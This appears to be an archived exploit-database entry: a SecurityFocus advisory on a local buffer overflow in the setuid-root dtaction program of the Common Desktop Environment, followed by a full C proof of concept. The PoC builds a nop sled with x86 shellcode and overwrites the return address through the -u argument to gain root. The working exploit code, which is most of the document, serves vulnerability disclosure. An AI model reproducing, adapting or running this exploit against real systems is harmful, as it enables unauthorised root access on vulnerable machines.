TRU64/DIGITAL UNIX 4.0 d/e/f,AIX <= 4.3.2,Common Desktop Environment <= 2.1,IRIX <= 6.5.14,Solaris <= 7.0 dtaction Userflag Buffer Overflow Vulnerability  

source: http://www.securityfocus.com/bid/635/info

CDE is the Common Desktop Environment, an implementation of a Desktop Manager for systems that run X. It is distributed with various commercial UNIX implementations.

Under some distributions of CDE Common Desktop Environment, the dtaction program has a locally exploitable buffer overflow condition. The buffer overflow condition exists in the argument parsing code for the -u (user) function. Any information provided by the user over 1024 bytes may overwrite the buffer and in return be exploited by a malicious user.

Since the dtaction program is typically installed setuid root, this make it possible for a local user to gain administrative access on a vulnerable system.

/*
* dtaction_ov.c
* Job de Haas
* (c) ITSX bv 1999
*
* This program demonstrates an overflow problem in /usr/dt/bin/dtaction.
* It has only been tested on Solaris 7 x86
* assembly code has been taken from ex_dtprintinfo86.c by unewn4th@usa.net
*
*/

#include <stdio.h>

#include <stdlib.h>
#include <string.h>
#include <pwd.h>

#define BUFLEN 998

char exploit_code[] =
"\xeb\x18\x5e\x33\xc0\x33\xdb\xb3\x08\x2b\xf3\x88\x06\x50\x50\xb0"
"\x8d\x9a\xff\xff\xff\xff\x07\xee\xeb\x05\xe8\xe3\xff\xff\xff"
"\xeb\x18\x5e\x33\xc0\x33\xdb\xb3\x08\x2b\xf3\x88\x06\x50\x50\xb0"
"\x17\x9a\xff\xff\xff\xff\x07\xee\xeb\x05\xe8\xe3\xff\xff\xff"
"\x55\x8b\xec\x83\xec\x08\xeb\x50\x33\xc0\xb0\x3b\xeb\x16\xc3\x33"
"\xc0\x40\xeb\x10\xc3\x5e\x33\xdb\x89\x5e\x01\xc6\x46\x05\x07\x88"
"\x7e\x06\xeb\x05\xe8\xec\xff\xff\xff\x9a\xff\xff\xff\xff\x0f\x0f"
"\xc3\x5e\x33\xc0\x89\x76\x08\x88\x46\x07\x89\x46\x0c\x50\x8d\x46"
"\x08\x50\x8b\x46\x08\x50\xe8\xbd\xff\xff\xff\x83\xc4\x0c\x6a\x01"
"\xe8\xba\xff\xff\xff\x83\xc4\x04\xe8\xd4\xff\xff\xff/bin/id";

main()
{
char *argp[6], *envp[3];
char buf[2048];
unsigned long *p;
struct passwd *pw;
int buflen;

if ((pw = getpwuid(getuid())) == NULL) {
perror("getpwuid");
exit(1);
}

buflen = BUFLEN - strlen( pw->pw_name );

memset(buf,0x90,buflen);

strncpy( &buf[500], exploit_code, strlen(exploit_code));

/* set some pointers to values that keep code running */
p = (unsigned long *)&buf[buflen];
*p++ = 0x37dc779b;
*p++ = 0xdfaf6502;
*p++ = 0x08051230;
*p++ = 0x080479b8;

/* the return address. */
*p++ = 0x08047710;
*p = 0;

argp[0] = strdup("/usr/dt/bin/dtaction");
argp[1] = strdup("-u");
argp[2] = strdup(buf);
argp[3] = strdup("Run");
argp[4] = strdup("/usr/bin/id");
argp[5] = NULL;

if (!getenv("DISPLAY")) {
printf("forgot to set DISPLAY\n");
exit(1);
}

envp[0] = malloc( strlen("DISPLAY=")+strlen(getenv("DISPLAY"))+1);
strcpy(envp[0],"DISPLAY=");
strcat(envp[0],getenv("DISPLAY"));
envp[1] = NULL;

execve("/usr/dt/bin/dtaction",argp,envp);

}
